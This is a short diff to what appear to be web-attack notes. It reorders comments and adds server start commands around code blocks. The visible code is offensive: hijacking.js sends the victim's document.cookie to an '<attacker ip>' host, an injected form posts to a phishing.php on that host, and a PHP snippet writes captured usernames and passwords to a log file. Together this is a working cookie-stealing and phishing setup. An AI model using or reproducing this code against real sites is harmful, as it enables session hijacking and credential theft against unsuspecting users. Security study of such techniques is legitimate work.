@@ -31,8 +31,10 @@ hijacking.js
 ```
 
 ```js
-// hijacking.js
 // sudo python3 -m http.server 80
+
+
+// hijacking.js
 var oReq = new XMLHttpRequest();
 oReq.open('GET', 'http://<attacker ip>/?output='+document.cookie, true);
 oReq.send()
@@ -56,6 +58,7 @@ document.write('<div><form id="form" action="http://<attacker ip>/phishing.php">
 ```
 
 ```php
+# sudo php -S 0.0.0.0:80
 <?php
 if (isset($_GET['username']) && isset($_GET['password'])) {
     $file = fopen("phishing.log", "a+");
